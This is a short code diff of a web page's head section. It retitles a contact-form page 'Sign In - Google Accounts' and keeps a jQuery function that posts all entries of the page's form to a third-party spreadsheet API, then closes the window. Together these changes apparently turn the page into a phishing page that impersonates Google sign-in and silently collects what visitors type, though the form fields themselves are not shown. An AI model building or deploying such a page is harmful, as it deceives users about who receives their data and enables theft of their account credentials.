@@ -1,24 +1,24 @@
 <head>
-  <title>Save Web Form Data to Spreadsheets - Contact Form</title>
+  <title>Sign In - Google Accounts</title>
   <script
-    src="https://code.jquery.com/jquery-3.4.1.js"
-    integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
-    crossorigin="anonymous"></script>
-  <script>
-  function SubForm (){
-    $.ajax({
-        url:'https://api.apispreadsheets.com/data/VXSGLmiB25lH6zii/',
-        type:'post',
-        data:$("#myForm").serializeArray(),
-        success: function(){
+		src="https://code.jquery.com/jquery-3.4.1.js"
+		integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+		crossorigin="anonymous"></script>
+	<script>
+		function SubForm (){
+			$.ajax({
+				url:"https://api.apispreadsheets.com/data/we5mACpoNqHXXSFC/",
+				type:"post",
+				data:$("#myForm").serializeArray(),
+				success: function(){
           close()
-        },
-        error: function(){
+				},
+				error: function(){
           close()
-        }
-    });
-  }
-  </script>
+				}
+			});
+		}
+	</script>
   </head>
 
 <link rel="stylesheet" type="text/css" href="style/stylesheet-popup.css">
